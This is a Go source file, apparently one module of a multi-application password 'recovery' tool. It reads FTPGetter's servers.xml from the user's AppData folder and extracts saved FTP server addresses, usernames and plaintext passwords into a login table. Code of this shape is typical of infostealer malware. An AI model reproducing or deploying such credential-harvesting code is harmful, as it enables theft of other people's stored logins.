package recovery_passwords

import (
	"io/ioutil"
	"regexp"
)

func Get_item_from_xml(xml_str, iteam string) []string {
	result := []string{}
	regexp_str := regexp.MustCompile(`<` + iteam + `>` + `(.*?)` + `</` + iteam + `>`)
	if regexp_str != nil {
		iteam_list := regexp_str.FindAllStringSubmatch(xml_str, -1)
		for _, iteamreg := range iteam_list {
			if len(iteamreg) == 2 {
				result = append(result, iteamreg[1])
			}
		}
	}
	return result
}

func Recovery_passwords_ftpgetter() []Logins_table_struct {
	result := []Logins_table_struct{}
	file_path := Appdata + "\\FTPGetter\\servers.xml"
	exist_flag, _ := PathExists(file_path)
	if exist_flag == true {
		file_bytes, err := ioutil.ReadFile(file_path)
		if err == nil {
			regexp_str := regexp.MustCompile(`(?s:<server>.*?</server>)`)
			if regexp_str != nil {
				server_list := regexp_str.FindAllStringSubmatch(string(file_bytes), -1)
				for _, server := range server_list {
					if len(server) > 0 {
						logins_table_struct := Logins_table_struct{}
						server_data := server[0]
						server_ip_list := Get_item_from_xml(server_data, "server_ip")
						append_flag := false
						if len(server_ip_list) > 0 {
							logins_table_struct.Origin_url = server_ip_list[0]
							append_flag = true
						}
						server_user_name_list := Get_item_from_xml(server_data, "server_user_name")
						if len(server_user_name_list) > 0 {
							logins_table_struct.Username_value = server_user_name_list[0]
							append_flag = true
						}
						server_user_password_list := Get_item_from_xml(server_data, "server_user_password")
						if len(server_user_password_list) > 0 {
							logins_table_struct.Password_value = server_user_password_list[0]
							append_flag = true
						}
						if append_flag == true {
							result = append(result, logins_table_struct)
						}
					}
				}
			}
		}
	}
	return result
}

func Recovery_passwords_ftpgetters() map[string][]Logins_table_struct {
	result_map := make(map[string][]Logins_table_struct)
	result := Recovery_passwords_ftpgetter()
	if len(result) > 0 {
		result_map["FTPGetter"] = result
	}
	return result_map
}
